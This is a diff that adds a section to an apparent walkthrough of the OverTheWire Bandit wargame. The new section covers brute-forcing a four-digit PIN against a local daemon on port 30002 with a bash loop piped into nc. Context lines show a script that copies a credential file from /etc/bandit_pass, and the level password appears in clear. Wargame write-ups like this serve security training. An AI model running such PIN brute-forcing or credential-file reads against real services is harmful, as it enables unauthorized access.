@@ -296,3 +296,23 @@ cat /etc/bandit_pass/bandit24 > /tmp/tmp.PfDlS1zMzF/password24
 ```
 
 Then we copy the script into `/var/spool/bandit24/foo` and we should see `password24` in our temp dir.
+
+## Level 24 -> Leve 25
+Goal: A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. (You do not need to create new connections each time)
+
+Let's connect to port 30002 to have a look how it looks like by using `nc localhost 30002`. We can enter multiple times in one connection so we don't need to connect multiple times. We can save all possibilities in one file.
+
+```
+# Create a temp dir by using "mktemp -d"
+bandit24@bandit:/tmp/tmp.q8t5byiUoz$ for i in {0000..9999}
+> do
+> echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> tmp.txt
+> done
+```
+
+Then we pass all possibilities to port 30002.
+```
+cat tmp.txt | nc localhost 30002
+```
+
+Level 25 -> Level 26
